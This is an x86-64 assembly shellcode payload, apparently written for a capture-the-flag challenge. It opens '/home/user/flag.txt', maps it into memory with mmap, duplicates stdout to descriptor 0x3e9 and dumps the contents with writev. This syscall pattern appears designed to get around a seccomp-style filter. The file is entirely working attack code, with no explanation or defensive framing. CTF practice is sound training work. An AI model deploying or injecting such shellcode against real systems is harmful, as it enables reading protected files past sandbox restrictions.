
    BITS 64
    DEFAULT REL

    section .text
    global _start

    _start:
        ; openat
        xor rdx, rdx
        lea rsi, [flagpath]
        mov rax, 257
        syscall
        mov r9, rax ; save fd

        ; try to mmap
        mov rdi, 0
        mov rsi, 0x1000
        mov rdx, 0x7
        mov r10, 0x2
        mov r8, r9
        mov r9, 0
        mov rax, 0x9
        syscall

        ; store the mmap'ed address, and create the iovec struct
        mov r12, rax
        mov r9, r12
        add r9, 0x100
        mov [r9], r12
        mov qword [r9+8], 0x40

        ; dup2 stdout to 0x3e9
        mov rdi, 1
        mov rsi, 0x3e9
        mov rax, 0x21
        syscall

        ; call writev to duplicated fd
        mov rax, 0x14
        mov rdi, 0x000003e9
        mov rsi, r9 ; addr to iovec
        mov rdx, 1
        syscall
        
        ; exit gracefully because why not
        mov rax, 60
        xor rdi, rdi
        syscall

    flagpath: db "/home/user/flag.txt", 0
    